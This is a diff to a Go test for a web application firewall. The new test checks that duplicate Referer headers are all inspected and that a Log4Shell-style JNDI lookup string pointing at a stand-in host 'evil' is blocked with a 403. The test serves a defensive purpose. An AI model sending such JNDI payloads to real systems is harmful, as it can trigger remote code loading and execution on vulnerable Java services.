@@ -28,6 +28,7 @@ import (
 
 const testYAML = `
 store: { backend: memory }
+signing_key_file: test-signing.key
 defaults:
   allowlist:
     paths: [ "/robots.txt" ]
@@ -161,6 +162,27 @@ defaults:
 	resp = do(t, "GET", ts.URL+"/auth", h, nil)
 	if resp.StatusCode != http.StatusForbidden || resp.Header.Get("X-Guardian-Reason") != "waf:jndi-header" {
 		t.Fatalf("jndi referer: status = %d reason = %q, want 403 waf:jndi-header",
+			resp.StatusCode, resp.Header.Get("X-Guardian-Reason"))
+	}
+
+	// net/http preserves duplicate field values. The WAF must inspect all of
+	// them instead of trusting only the first occurrence.
+	req, err := http.NewRequest(http.MethodGet, ts.URL+"/auth", nil)
+	if err != nil {
+		t.Fatal(err)
+	}
+	for k, v := range guardianHeaders("plain.test", "198.51.100.7", "/page", "Mozilla/5.0") {
+		req.Header.Set(k, v)
+	}
+	req.Header.Add("Referer", "https://example.com/")
+	req.Header.Add("Referer", "${jndi:ldap://evil/a}")
+	resp, err = http.DefaultClient.Do(req)
+	if err != nil {
+		t.Fatal(err)
+	}
+	t.Cleanup(func() { resp.Body.Close() })
+	if resp.StatusCode != http.StatusForbidden || resp.Header.Get("X-Guardian-Reason") != "waf:jndi-header" {
+		t.Fatalf("duplicate referer: status = %d reason = %q, want 403 waf:jndi-header",
 			resp.StatusCode, resp.Header.Get("X-Guardian-Reason"))
 	}
 
